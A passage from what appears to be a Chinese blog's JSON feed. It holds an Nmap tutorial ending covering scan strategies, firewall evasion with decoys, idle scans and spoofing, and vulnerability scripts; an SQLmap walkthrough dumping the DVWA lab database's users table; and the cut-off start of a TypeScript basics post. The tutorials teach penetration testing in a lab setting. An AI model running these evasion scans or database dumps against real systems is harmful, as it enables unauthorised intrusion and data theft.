aria-hidden=\"true\"><div></div></div></div><div><p>提示</p>\n<p><code>-sU</code> UDP 连接扫描（ <code>s</code> ==&gt; 哪种类型扫描； <code>U</code> ==&gt; UDP 类型）<br> <code>-sV</code> UDP 扫描中添加版本扫描信息（ <code>V</code> ==&gt; 版本信息）<br> 不存在 <code>-Pn</code> 参数（从 UDP 协议去理解, 你发了就 ok 管他收没收到）</p>\n</div>\n<h3 id=\"扫描-ip-段\" tabindex=\"-1\"> 扫描 IP 段</h3>\n<p><code>For Example:</code></p>\n<div><pre><code>nmap <span>192.168</span>.1.1-255    <span># 扫描 192.168.1.1－192.168.1.255 所有 IP</span>\nnmap <span>192.168</span>.1.1/24     <span># 扫描 192.168.1.1－192.168.1.255 所有 IP</span>\nnmap -iL IPL.txt        <span># 扫描 IPL.txt 中保存的所有 IP</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div></div></div><h3 id=\"输出保存选项\" tabindex=\"-1\"> 输出保存选项</h3>\n<ul>\n<li><strong>-oN</strong> =&gt; 保存为文本文件</li>\n<li><strong>-oX</strong> =&gt; 保存为 XML 文件</li>\n<li><strong>-oG</strong> =&gt; 保存为 GREPable 输出</li>\n<li><strong>-oS</strong> =&gt; 脚本输出</li>\n</ul>\n<h2 id=\"其他更详细的扫描\" tabindex=\"-1\"> 其他更详细的扫描</h2>\n<h3 id=\"nmap-扫描策略\" tabindex=\"-1\"> Nmap 扫描策略</h3>\n<div><pre><code><span># 适用所有大小网络最好的 nmap 扫描策略</span>\n\n<span># 主机发现,生成存活主机列表</span>\nnmap -sn -T4 -oG Discovery.gnmap <span>192.168</span>.56.0/24\n<span>grep</span> <span>\"Status: Up\"</span> Discovery.gnmap <span>|</span> <span>cut</span> -f <span>2</span> -d <span>' '</span> <span>></span> LiveHosts.txt\n\n<span># 端口发现,发现大部分常用端口</span>\n<span># https//nmap.org/presentations/BHDC08/bhdc08-slides-fyodor.pdf</span>\nnmap -sS -T4 -Pn -oG TopTCP -iL LiveHosts.txt\nnmap -sU -T4 -Pn -oN TopUDP -iL LiveHosts.txt\nnmap -sS -T4 -Pn --top-ports <span>3674</span> -oG <span>3674</span> -iL LiveHosts.txt\n\n<span># 端口发现,发现全部端口,但 UDP 端口的扫描会非常慢</span>\nnmap -sS -T4 -Pn -p <span>0</span>-65535 -oN FullTCP -iL LiveHosts.txt\nnmap -sU -T4 -Pn -p <span>0</span>-65535 -oN FullUDP -iL LiveHosts.txt\n\n<span># 显示 TCP\\UDP 端口</span>\n<span>grep</span> <span>\"open\"</span> FullTCP<span>|</span><span>cut</span> -f <span>1</span> -d <span>' '</span> <span>|</span> <span>sort</span> -nu <span>|</span> <span>cut</span> -f <span>1</span> -d <span>'/'</span> <span>|</span><span>xargs</span> <span>|</span> <span>sed</span> <span>'s/ /,/g'</span><span>|</span><span>awk</span> <span>'{print \"T:\"$0}'</span>\n<span>grep</span> <span>\"open\"</span> FullUDP<span>|</span><span>cut</span> -f <span>1</span> -d <span>' '</span> <span>|</span> <span>sort</span> -nu <span>|</span> <span>cut</span> -f <span>1</span> -d <span>'/'</span> <span>|</span><span>xargs</span> <span>|</span> <span>sed</span> <span>'s/ /,/g'</span><span>|</span><span>awk</span> <span>'{print \"U:\"$0}'</span>\n\n<span># 侦测服务版本</span>\nnmap -sV -T4 -Pn -oG ServiceDetect -iL LiveHosts.txt\n\n<span># 扫做系统扫描</span>\nnmap -O -T4 -Pn -oG OSDetect -iL LiveHosts.txt\n\n<span># 系统和服务检测</span>\nnmap -O -sV -T4 -Pn -p U:53,111,137,T:21-25,80,139,8080 -oG OS_Service_Detect -iL LiveHosts.txt\n\n<span># 扫描 B 段的存活主机</span>\nnmap -v -sn -PE -n --min-hostgroup <span>1024</span> --min-parallelism <span>1024</span> <span>172.16</span>.0.0/16 <span>|</span> <span>grep</span> -v down <span>|</span> <span>grep</span> <span>\"172.16.\"</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h3 id=\"nmap-躲避防火墙\" tabindex=\"-1\"> Nmap 躲避防火墙</h3>\n<div><pre><code><span># 分段</span>\nnmap -f\n\n<span># 修改默认 MTU 大小,但必须为 8 的倍数(8,16,24,32 等等)</span>\nnmap --mtu <span>24</span>\n\n<span># 生成随机数量的欺骗</span>\nnmap -D RND:10 <span>[</span>target<span>]</span>\n\n<span># 手动指定欺骗使用的 IP</span>\nnmap -D decoy1,decoy2,decoy3 etc.\n\n<span># 僵尸网络扫描, 首先需要找到僵尸网络的IP</span>\nnmap -sI <span>[</span>Zombie IP<span>]</span> <span>[</span>Target IP<span>]</span>\n\n<span># 指定源端口号</span>\nnmap --source-port <span>80</span> IP\n\n<span># 在每个扫描数据包后追加随机数量的数据</span>\nnmap --data-length <span>25</span> IP\n\n<span># MAC 地址欺骗,可以生成不同主机的 MAC 地址</span>\nnmap --spoof-mac Dell/Apple/3Com IP\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h3 id=\"nmap-进行-web-漏洞扫描\" tabindex=\"-1\"> Nmap 进行 Web 漏洞扫描</h3>\n<div><pre><code><span>cd</span> /usr/share/nmap/scripts/\n<span>wget</span> https://www.computec.ch/projekte/vulscan/download/nmap_nse_vulscan-2.0.tar.gz <span>&amp;&amp;</span> <span>tar</span> xzf nmap_nse_vulscan-2.0.tar.gz\nnmap -sS -sV --script<span>=</span>vulscan/vulscan.nse target\nnmap -sS -sV --script<span>=</span>vulscan/vulscan.nse –script-args <span>vulscandb</span><span>=</span>scipvuldb.csv target\nnmap -sS -sV --script<span>=</span>vulscan/vulscan.nse –script-args <span>vulscandb</span><span>=</span>scipvuldb.csv -p80 target\nnmap -PN -sS -sV --script<span>=</span>vulscan –script-args <span>vulscancorrelation</span><span>=</span><span>1</span> -p80 target\nnmap -sV --script<span>=</span>vuln target\nnmap -PN -sS -sV --script<span>=</span>all –script-args <span>vulscancorrelation</span><span>=</span><span>1</span> target\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h3 id=\"nmap-端口扫描\" tabindex=\"-1\"> Nmap 端口扫描</h3>\n<div><pre><code><span># 使用诱饵隐蔽扫描 nmap -D RND:10 [target] (生成随机数量的诱饵)</span>\n<span># fargement</span>\n<span># data packed – like orginal one not scan packet</span>\n<span># 使用 auxiliary/scanner/ip/ipidseq 来在僵尸网络中查找IP并使用这些IP进行扫描 — nmap -sI ip target</span>\n<span># nmap –source-port 53 target</span>\n\nnmap -sS -sV -D IP1,IP2,IP3,IP4,IP5 -f –mtu<span>=</span><span>24</span> –data-length<span>=</span><span>1337</span> -T2 target <span>(</span>随机使用不同的IP进行扫描<span>)</span>\nnmap -Pn -T2 -sV –randomize-hosts IP1,IP2\nnmap –script smb-check-vulns.nse -p445 target <span>(</span>使用 NSE 脚本<span>)</span>\nnmap -sU -P0 -T Aggressive -p123 target <span>(</span>攻击式扫描 T1-T5<span>)</span>\nnmap -sA -PN -sN target\nnmap -sS -sV -T5 -F -A -O target <span>(</span>版本检测<span>)</span>\nnmap -sU -v target <span>(</span>Udp<span>)</span>\nnmap -sU -P0 <span>(</span>Udp<span>)</span>\nnmap -sC <span>192.168</span>.31.10-12 <span>(</span>全部使用默认配置<span>)</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h2 id=\"示例扫描\" tabindex=\"-1\"> 示例扫描</h2>\n<h3 id=\"示例一-syn-扫描\" tabindex=\"-1\"> 示例一: SYN 扫描</h3>\n<p><code>For Example:</code></p>\n<div><pre><code>nmap -sS -T5 <span>192.168</span>.199.133\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><p><img src=\"/assets/liunx-nmap-1.png\" alt=\"Namp\"></p>\n<h3 id=\"示例二-基础信息扫描\" tabindex=\"-1\"> 示例二: 基础信息扫描</h3>\n<p><code>For Example:</code></p>\n<div><pre><code>nmap -O <span>192.168</span>.199.133\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><p><img src=\"/assets/liunx-nmap-2.png\" alt=\"Namp\"></p>\n<h3 id=\"示例三-详细信息扫描\" tabindex=\"-1\"> 示例三: 详细信息扫描</h3>\n<p><code>For Example:</code></p>\n<div><pre><code>nmap -A <span>192.168</span>.199.133\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><p><img src=\"/assets/liunx-nmap-3.png\" alt=\"Namp\"></p>\n<br>\n<p><img src=\"/assets/liunx-nmap-4.png\" alt=\"Namp\"></p>\n<br>\n<p><img src=\"/assets/liunx-nmap-5.png\" alt=\"Namp\"></p>\n<h3 id=\"示例四-网段扫描\" tabindex=\"-1\"> 示例四: 网段扫描</h3>\n<p><code>For Example:</code></p>\n<div><pre><code>nmap -T5 <span>192.168</span>.1.103-110\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><p><img src=\"/assets/liunx-nmap-6.png\" alt=\"Namp\"></p>\n<br>\n<p><img src=\"/assets/liunx-nmap-7.png\" alt=\"Namp\"></p>\n",
      "image": "https://vxhly.github.io/assets/liunx-nmap-1.png",
      "date_published": "2016-09-23T16:29:57.000Z",
      "date_modified": "2022-06-11T12:24:01.000Z",
      "authors": [
        {
          "name": "星火燎原@vxhly"
        }
      ],
      "tags": [
        "pentest"
      ]
    },
    {
      "title": "渗透工具用法（一）SQLmap 的用法",
      "url": "https://vxhly.github.io/views/pentest/usage-of-sqlmap.html",
      "id": "https://vxhly.github.io/views/pentest/usage-of-sqlmap.html",
      "summary": "前言\n此系列笔记是网络渗透工具的使用方法, 本篇是介绍 SQL 注入工具 SQLmap 的使用方法。SQLmap 是一款用来检测与利用 SQL 注入漏洞的免费开源工具, 有一个非常棒的特性, 即对检测与利用的自动化处理（数据库指纹、访问底层文件系统、执行命令）。\n\n",
      "content_html": "<div><p>前言</p>\n<p>此系列笔记是网络渗透工具的使用方法, 本篇是介绍 SQL 注入工具 SQLmap 的使用方法。SQLmap 是一款用来检测与利用 SQL 注入漏洞的免费开源工具, 有一个非常棒的特性, 即对检测与利用的自动化处理（数据库指纹、访问底层文件系统、执行命令）。</p>\n</div>\n\n<h2 id=\"sqlmap-环境\" tabindex=\"-1\"> SQLmap 环境</h2>\n<div><p>提示</p>\n<p>由于 <code>kali Liunx</code> 已经集成了 SQLmap 的环境, 这里就直接介绍 <code>Windows</code> 下环境的构建。</p>\n</div>\n<h3 id=\"先安装-python\" tabindex=\"-1\"> 先安装 Python</h3>\n<p>正常情况下我们安装 <code>2.7.x</code> 就好了。</p>\n<p><a href=\"http://www.python.org/getit/\" target=\"_blank\" rel=\"noopener noreferrer\">Python 官网下载地址</a></p>\n<p>接下来只需在环境变量 <code>path</code> 中添加 Python 的安装路径就好了。<br></p>\n<p><img src=\"/assets/sqlmap-1.png\" alt=\"SQLmap\"></p>\n<h3 id=\"再安装-sqlmap\" tabindex=\"-1\"> 再安装 SQLmap</h3>\n<p><a href=\"http://sqlmap.org/\" target=\"_blank\" rel=\"noopener noreferrer\">SQLmap 官网下载地址</a></p>\n<p>将 SQLmap 解压至 Python 目录下, 将 SQLmap 的程序目录重命名为 sqlmap。</p>\n<h4 id=\"在桌面新建快捷方式\" tabindex=\"-1\"> 在桌面新建快捷方式</h4>\n<p><code>For Example:</code></p>\n<p><img src=\"/assets/sqlmap-2.png\" alt=\"SQLmap\"></p>\n<br>\n<p><img src=\"/assets/sqlmap-3.png\" alt=\"SQLmap\"></p>\n<br>\n<p><img src=\"/assets/sqlmap-4.png\" alt=\"SQLmap\"></p>\n<h2 id=\"dvwa-环境\" tabindex=\"-1\"> DVWA 环境</h2>\n<p>DVWA(Dam Vulnerable Web Application) 使用 <code>PHP+Mysql</code> 编写的一套用于常规 WEB 漏洞教学和检测的 WEB 脆弱性测试程序。包含 SQL 注入、XSS、盲注等常见的一些漏洞。</p>\n<p><a href=\"http://github.com/ethicalhack3r/DVWA\" target=\"_blank\" rel=\"noopener noreferrer\">DVWA GitHub 下载地址</a></p>\n<p>在 <code>Windows</code> 下还需安装 <code>PHP</code> 环境, 这里推介两个 <code>PHP</code> 集成环境。</p>\n<p><a href=\"http://www.upupw.net/\" target=\"_blank\" rel=\"noopener noreferrer\">upupw PHP 集成环境</a> <a href=\"http://www.phpstudy.net/\" target=\"_blank\" rel=\"noopener noreferrer\">phpStudy PHP 集成环境</a></p>\n<p>接下来只需修改一下配置文件就好了。</p>\n<h2 id=\"sqlmap-使用方法\" tabindex=\"-1\"> SQlmap 使用方法</h2>\n<p><code>Windows</code> 下跟 <code>kali Liunx</code> 下使用方法不相同。</p>\n<p>为方便演示, 我们创建两个虚拟机:</p>\n<ul>\n<li>受害者机器, <code>Windows 2003</code> 操作系统, 运行一个 WEB 服务器, 同时跑着一个包含漏洞的 WEB 应用（DVWA）。</li>\n<li>攻击器机器, 使用 <code>kali Liunx</code> 或者其他版本的 <code>Windows</code> 包含 SQLmap 程序。</li>\n</ul>\n<p>本次实验的目的: 使用 SQLmap 得到以下信息:</p>\n<ul>\n<li>枚举 MYSQL 用户名与密码。</li>\n<li>枚举所有数据库。</li>\n<li>枚举指定数据库的数据表。</li>\n<li>枚举指定数据表中的所有用户名与密码。</li>\n</ul>\n<h3 id=\"查看帮助\" tabindex=\"-1\"> 查看帮助</h3>\n<p><code>Windows: </code> 查看 Python 帮助命令</p>\n<div><pre><code>python sqlmap.py -h\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><p><code>kali Liunx: </code> 查看 Python 帮助命令</p>\n<div><pre><code>sqlmap -h\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><div><p>注意</p>\n<p>需要注意的是 <code>Windows</code> 下的选项和 <code>kali Liunx</code> 下的选项是一致的, 但是命令是不一致的。在 <code>Windows</code> 下使用 <code>python sqlmap.py</code> , 而在 <code>kali Liunx</code> 下使用的是 <code>sqlmap</code> 。</p>\n</div>\n<h3 id=\"选项解释\" tabindex=\"-1\"> 选项解释</h3>\n<ul>\n<li><strong>--cookie</strong> =&gt; 设置我们的 cookie 值 &quot;将 DVWA 安全等级设置为 low&quot;</li>\n<li><strong>--data</strong> =&gt; 设置 POST 提交的值, 如果是 GET 提交, 不需要此选项</li>\n<li><strong>-u</strong> =&gt; 指定目标 URL</li>\n<li><strong>-b</strong> =&gt; 获取 DBMS banner</li>\n<li><strong>--current-db</strong> =&gt; 获取当前数据库</li>\n<li><strong>--current-user</strong> =&gt; 获取当前数据库的用户</li>\n<li><strong>--tables</strong> =&gt; 获取数据库里所有的表名</li>\n<li><strong>--columns</strong> =&gt; 获取表里的所有字段</li>\n<li><strong>--dump</strong> =&gt; 获取值</li>\n<li><strong>--current-user</strong> =&gt; 获取当前用户</li>\n<li><strong>-D</strong> =&gt; 爆库指定数据库名</li>\n<li><strong>-T</strong> =&gt; 爆库指定表名</li>\n<li><strong>-C</strong> =&gt; 爆库指定字段名</li>\n<li><strong>--string</strong> =&gt; 当查询可用时用来匹配页面中的字符串</li>\n<li><strong>--users</strong> =&gt; 枚举 DBMS 用户</li>\n<li><strong>--password</strong> =&gt; 枚举 DBMS 用户密码 hash</li>\n<li><strong>--dbs</strong> =&gt; 枚举 DBMS 中的数据库</li>\n</ul>\n<h2 id=\"开始爆库\" tabindex=\"-1\"> 开始爆库</h2>\n<p>由于 <code>Windows</code> 和 <code>kali Liunx</code> 的做法基本一致, 这里以 <code>kali Liunx</code> 为例。DVWA 的难度为 low。</p>\n<h3 id=\"先获取-cookie\" tabindex=\"-1\"> 先获取 Cookie</h3>\n<p>每一次的 Cookie 都不一样, 这里是个示范。</p>\n<p><code>For Example:</code> <br></p>\n<p><img src=\"/assets/sqlmap-5.png\" alt=\"SQLmap\"></p>\n<h3 id=\"获取数据库-current-db\" tabindex=\"-1\"> 获取数据库, --current-db</h3>\n<p><code>For Example:</code></p>\n<div><pre><code>sqlmap -u <span>\"//192.168.79.132/vulnerabilities/sqli/?id=1&amp;Submit=Submit#\"</span> --cookie<span>=</span><span>\"PHPSESSID=austaukdtb8jq2919eideuqkp3;security=low\"</span> --current-db\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><p>URL 地址和 Cookie 请用真实的替换掉。这条命令可以把当前所有的数据库获取出来的。注意 <code>--current-db</code> 的 <code>-</code> 可是有两个的。</p>\n<p><img src=\"/assets/sqlmap-6.png\" alt=\"SQLmap\"></p>\n<h3 id=\"获取表-tables\" tabindex=\"-1\"> 获取表, --tables</h3>\n<p>前面, 我们已经获取到数据库名, 这时候我们要指定数据库名。使用 <code>-D</code> 选项指定数据库名。注意 <code>--tables</code> 的 <code>-</code> 可是有两个的。</p>\n<p><code>For Example:</code></p>\n<div><pre><code>sqlmap -u <span>\"//192.168.79.132/vulnerabilities/sqli/?id=1&amp;Submit=Submit#\"</span> --cookie<span>=</span><span>\"PHPSESSID=austaukdtb8jq2919eideuqkp3;security=low\"</span> -D <span>'dvwa'</span> --tables\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><p><img src=\"/assets/sqlmap-7.png\" alt=\"SQLmap\"></p>\n<h3 id=\"获取字段-columns\" tabindex=\"-1\"> 获取字段, --columns</h3>\n<div><p>提示</p>\n<p>前面, 我们已经获取到数据库名和表名了, 这时候我们要指定数据库名和表名。使用 <code>-D</code> 选项指定数据库名, 使用 <code>-T</code> 指定表名。这里我们选择表 <code>users</code> 。注意 <code>--columns</code> 的 <code>-</code> 可是有两个的。</p>\n</div>\n<p><code>For Example:</code></p>\n<div><pre><code>sqlmap -u <span>\"//192.168.79.132/vulnerabilities/sqli/?id=1&amp;Submit=Submit#\"</span> --cookie<span>=</span><span>\"PHPSESSID=austaukdtb8jq2919eideuqkp3;security=low\"</span> -D <span>'dvwa'</span> -T <span>'users'</span> --columns\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><p><img src=\"/assets/sqlmap-8.png\" alt=\"SQLmap\"></p>\n<h3 id=\"获取数据-dump\" tabindex=\"-1\"> 获取数据, --dump</h3>\n<div><p>提示</p>\n<p>前面, 我们已经获取到数据库名、表名还有字段名了, 这时候我们要指定数据库名、表名还有字段名。使用 <code>-D</code> 选项指定数据库名, 使用 <code>-T</code> 指定表名, 使用 <code>-C</code> 指定字段名。这里我们选择表 <code>users</code> 中的字段 <code>user_id</code> 。注意 <code>--dump</code> 的 <code>-</code> 可是有两个的。</p>\n</div>\n<p><code>For Example:</code></p>\n<div><pre><code>sqlmap -u <span>\"//192.168.79.132/vulnerabilities/sqli/?id=1&amp;Submit=Submit#\"</span> --cookie<span>=</span><span>\"PHPSESSID=austaukdtb8jq2919eideuqkp3;security=low\"</span> -D <span>'dvwa'</span> -T <span>'users'</span> -C <span>'user_id'</span> --dump\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><p><img src=\"/assets/sqlmap-9.png\" alt=\"SQLmap\"></p>\n",
      "image": "https://vxhly.github.io/assets/sqlmap-1.png",
      "date_published": "2016-09-20T10:46:46.000Z",
      "date_modified": "2022-06-11T12:24:01.000Z",
      "authors": [
        {
          "name": "星火燎原@vxhly"
        }
      ],
      "tags": [
        "pentest"
      ]
    },
    {
      "title": "typescript 的基础使用",
      "url": "https://vxhly.github.io/views/typescript/typescript-usage.html",
      "id": "https://vxhly.github.io/views/typescript/typescript-usage.html",
      "summary": "前言\nvue3 已经发布了, ts 的脚步已经阻拦不住了, 还只会 es6?别想了, 人家都已经在行动了, 以下是 ts 的基本系列教程, ts 的基本语法, 高级语法等, 以及在 vue 项目中如何应用 ts, 跟着我赶紧撸起来吧.\n\n",
      "content_html": "<div><p>前言</p>\n<p>vue3 已经发布了, ts 的脚步已经阻拦不住了, 还只会 es6?别想了, 人家都已经在行动了, 以下是 ts 的基本系列教程, ts 的基本语法, 高级语法等, 以及在 vue 项目中如何应用 ts, 跟着我赶紧撸起来吧.</p>\n</div>\n\n<h2 id=\"基本数据类型\" tabindex=\"-1\"> 基本数据类型</h2>\n<h3 id=\"数字\" tabindex=\"-1\"> 数字</h3>\n<div><pre><code><span>const</span> a<span>:</span> <span>number</span> <span>=</span> <span>3</span><span>;</span>\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><h3 id=\"字符串\" tabindex=\"-1\"> 字符串</h3>\n<div><pre><code><span>const</span> b<span>:</span> <span>string</span> <span>=</span> <span>\"1\"</span><span>;</span>\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><h3 id=\"数组\" tabindex=\"-1\"> 数组</h3>\n<div><pre><code><span>const</span> c<span>:</span> <span>number</span><span>[</span><span>]</span> <span>=</span> <span>[</span><span>1</span><span>,</span> <span>2</span><span>,</span> <span>3</span><span>]</span><span>;</span>\n<span>const</span> d<span>:</span> <span>Array</span><span>&lt;</span><span>number</span><span>></span> <span>=</span> <span>[</span><span>1</span><span>,</span> <span>3</span><span>]</span><span>;</span>\n<span>const</span> arr<span>:</span> <span>any</span><span>[</span><span>]</span> <span>=</span> <span>[</span><span>1</span><span>,</span> <span>\"33\"</span><span>,</span> <span>true</span><span>]</span><span>;</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div></div></div><h3 id=\"元组\" tabindex=\"-1\"> 元组</h3>\n<p>可以为数组中的每个参数定义相对应的类型</p>\n<div><pre><code><span>const</span> e<span>:</span> <span>[</span><span>number</span><span>,</span> <span>string</span><span>]</span> <span>=</span> <span>[</span><span>1</span><span>,</span> <span>\"ww\"</span><span>]</span><span>;</span>\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><h3 id=\"枚举\" tabindex=\"-1\"> 枚举</h3>\n<div><pre><code><span>enum</span> error <span>{</span>\n  blue <span>=</span> <span>3</span><span>,</span>\n  <span>\"orange\"</span><span>,</span>\n<span>}</span>\n<span>const</span> f<span>:</span> error <span>=</span> error<span>.</span>orange<span>;</span>\n<span>console</span><span>.</span><span>log</span><span>(</span>f<span>)</span><span>;</span> <span>//输出4</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div><div></div></div></div><div><p>提示</p>\n<p>如果未赋值的上一个值是数字那么这个未赋值的值的是上一个值的值 +1 如果未赋值的上一个值未赋值那么输出的就是它的下标如果未赋值的上一个值的值是非数字, 那么必须赋值</p>\n</div>\n<h3 id=\"布尔类型\" tabindex=\"-1\"> 布尔类型</h3>\n<div><pre><code><span>const</span> g<span>:</span> <span>boolean</span> <span>=</span> <span>true</span><span>;</span>\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><h3 id=\"对象\" tabindex=\"-1\"> 对象</h3>\n<div><pre><code><span>const</span> i<span>:</span> object <span>=</span> <span>{</span><span>}</span><span>;</span>\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><h3 id=\"undefined\" tabindex=\"-1\"> undefined</h3>\n<p>常用于组合类型</p>\n<div><pre><code><span>let</span> j<span>:</span> <span>number</span> <span>|</span> <span>undefined</span><span>;</span>\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><h3 id=\"null\" tabindex=\"-1\"> null</h3>\n<div><pre><code><span>let</span> k<span>:</span> <span>null</span><span>;</span>\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><h3 id=\"void\" tabindex=\"-1\"> void</h3>\n<p>指定方法类型, 表示没有返回值,方法体中不能 return</p>\n<div><pre><code><span>function</span> <span>aa</span><span>(</span><span>)</span><span>:</span> <span>void</span> <span>{</span>\n  <span>console</span><span>.</span><span>log</span><span>(</span><span>1</span><span>)</span><span>;</span>\n<span>}</span>\n\n<span>//如果方法有返回值, 可以加上返回值的类型</span>\n<span>function</span> <span>bb</span><span>(</span><span>)</span><span>:</span> <span>number</span> <span>{</span>\n  <span>return</span> <span>1</span><span>;</span>\n<span>}</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h3 id=\"never\" tabindex=\"-1\"> never</h3>\n<p>其他类型 (包括 null 和 undefined)的子类型, 代表从不会出现的值</p>\n<div><pre><code><span>let</span> l<span>:</span> <span>never</span><span>;</span>\n\n<span>//匿名函数并抛出异常</span>\nl <span>=</span> <span>(</span><span>(</span><span>)</span> <span>=></span> <span>{</span>\n  <span>throw</span> <span>new</span> <span>Error</span><span>(</span><span>\"111\"</span><span>)</span><span>;</span>\n<span>}</span><span>)</span><span>(</span><span>)</span><span>;</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h3 id=\"任意类型\" tabindex=\"-1\"> 任意类型</h3>\n<p>让参数可以是任何一种类型</p>\n<div><pre><code><span>let</span> h<span>:</span> <span>any</span> <span>=</span> <span>1</span><span>;</span>\nh <span>=</span> <span>true</span><span>;</span>\nh <span>=</span> <span>\"st\"</span><span>;</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div></div></div><h2 id=\"函数\" tabindex=\"-1\"> 函数</h2>\n<h3 id=\"函数申明\" tabindex=\"-1\"> 函数申明</h3>\n<div><pre><code><span>function</span> <span>cc</span><span>(</span><span>)</span><span>:</span> <span>void</span> <span>{</span><span>}</span>\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><h3 id=\"方法传参\" tabindex=\"-1\"> 方法传参</h3>\n<div><pre><code><span>function</span> <span>getUserInfo</span><span>(</span>name<span>:</span> <span>string</span><span>,</span> age<span>?</span><span>:</span> <span>number</span><span>,</span> school<span>:</span> <span>string</span> <span>=</span> <span>\"清华大学\"</span><span>)</span> <span>{</span>\n  <span>return</span> <span><span>`</span><span>name:</span><span><span>${</span>name<span>}</span></span><span>--age:</span><span><span>${</span>age<span>}</span></span><span>--school:</span><span><span>${</span>school<span>}</span></span><span>`</span></span><span>;</span>\n<span>}</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div></div></div><div><p>提示</p>\n<p><code>:?</code> 代表这个参数可传可不传,不传就是 undefined,也可定义个默认的值</p>\n</div>\n<h3 id=\"剩余参数\" tabindex=\"-1\"> 剩余参数</h3>\n<p>传递多个时, 如果用了剩余参数, 就可以把未定义的形参转换为数组。</p>\n<div><pre><code><span>function</span> <span>sum</span><span>(</span>a<span>:</span> <span>number</span><span>,</span> b<span>:</span> <span>number</span><span>,</span> <span>...</span>arr<span>:</span> <span>number</span><span>[</span><span>]</span><span>)</span><span>:</span> <span>number</span> <span>{</span>\n  <span>let</span> sum<span>:</span> <span>number</span> <span>=</span> a <span>+</span> b<span>;</span>\n  arr<span>.</span><span>forEach</span><span>(</span><span>(</span>element<span>)</span> <span>=></span> <span>{</span>\n    sum <span>+=</span> element<span>;</span>\n  <span>}</span><span>)</span><span>;</span>\n  <span>console</span><span>.</span><span>log</span><span>(</span>arr<span>)</span><span>;</span>\n  <span>[</span><span>3</span><span>,</span> <span>4</span><span>,</span> <span>5</span><span>]</span><span>;</span>\n  <span>return</span> sum<span>;</span>\n<span>}</span>\n<span>console</span><span>.</span><span>log</span><span>(</span><span>sum</span><span>(</span><span>1</span><span>,</span> <span>2</span><span>,</span> <span>3</span><span>,</span> <span>4</span><span>,</span> <span>5</span><span>)</span><span>)</span><span>;</span> <span>//15</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h3 id=\"函数重载\" tabindex=\"-1\"> 函数重载</h3>\n<div><pre><code><span>function</span> <span>reload</span><span>(</span>name<span>:</span> <span>string</span><span>)</span><span>:</span> <span>string</span><span>;</span>\n<span>function</span> <span>reload</span><span>(</span>age<span>:</span> <span>number</span><span>)</span><span>:</span> <span>string</span><span>;</span>\n<span>function</span> <span>reload</span><span>(</span>param<span>:</span> <span>any</span><span>)</span><span>:</span> <span>any</span> <span>{</span>\n  <span>return</span> <span>typeof</span> param <span>===</span> <span>\"string\"</span> <span>?</span> <span><span>`</span><span>我是:</span><span><span>${</span>param<span>}</span></span><span>`</span></span> <span>:</span> <span><span>`</span><span>我的年龄:</span><span><span>${</span>param<span>}</span></span><span>`</span></span><span>;</span>\n<span>}</span>\n<span>console</span><span>.</span><span>log</span><span>(</span><span>reload</span><span>(</span><span>18</span><span>)</span><span>)</span><span>;</span> <span>//年龄</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div><div></div></div></div><div><p>提示</p>\n<p>被重载的方法, 是没有方法体, 可以根据参数的类型走其中一个方法并判断参数, 但如果传入的参数类型不是任何被重载方法的参数类型就不允许通过。</p>\n</div>\n<h2 id=\"类\" tabindex=\"-1\"> 类</h2>\n<div><pre><code><span>class</span> <span>Person</span> <span>{</span>\n  <span>// 私有变量</span>\n  <span>private</span> name<span>:</span> <span>string</span><span>;</span>\n\n  <span>// 构造函数</span>\n  <span>constructor</span><span>(</span>name<span>:</span> <span>string</span><span>)</span> <span>{</span>\n    <span>this</span><span>.</span>name <span>=</span> name<span>;</span>\n  <span>}</span>\n\n  <span>// 获取名字</span>\n  <span>getName</span><span>(</span><span>)</span><span>:</span> <span>string</span> <span>{</span>\n    <span>return</span> <span>this</span><span>.</span>name<span>;</span>\n  <span>}</span>\n\n  <span>// 设置名字</span>\n  <span>setName</span><span>(</span>name<span>:</span> <span>string</span><span>)</span><span>:</span> <span>void</span> <span>{</span>\n    <span>this</span><span>.</span>name <span>=</span> name<span>;</span>\n  <span>}</span>\n<span>}</span>\n\n<span>let</span> p <span>=</span> <span>new</span> 